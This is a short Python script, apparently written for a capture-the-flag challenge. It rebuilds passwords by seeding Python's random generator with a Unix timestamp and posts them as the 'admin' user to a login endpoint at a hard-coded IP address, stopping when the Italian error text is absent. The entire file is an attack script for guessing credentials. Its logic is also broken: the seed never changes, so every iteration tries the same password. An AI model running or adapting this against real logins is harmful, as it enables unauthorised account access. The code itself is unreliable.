import requests
import time
import random
import string
import os

url="http://5.75.232.207:35008/login"




time=1694074186


for i in range(1000000):
    length = len(str(i))
    transformed_number = i / (10 ** (length))
    random.seed(1694074186.654595)
    password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
   


    s=requests.session()
    r=requests.post(url, data={"username":"admin", "password":password})

    if "errati" in r.text:
        continue

    print(password)
    print(1694074186+transformed_number)
    input()


    
